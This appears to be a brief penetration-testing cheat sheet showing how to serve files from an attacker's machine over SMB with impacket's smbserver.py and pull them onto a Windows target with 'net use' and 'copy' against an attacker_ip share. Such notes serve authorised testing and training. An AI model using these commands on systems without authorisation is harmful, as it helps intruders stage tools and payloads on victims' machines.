
We can use an SMB server to copy files into a windows box from our attacker's machine


#### On the attacker's end

Create an SMB share in the folder where your sharable files are stored

```python
smbserver.py <share_name> <share_path> -ts -smb2support -username any -password any
```



#### On the target machine

1. connect to the share 

```batch
net use \\attacker_ip\sharename /u:username password
```


2. Copy contents from the share to a writable location

```batch
copy \\ip\sharename\filename <destination>
```




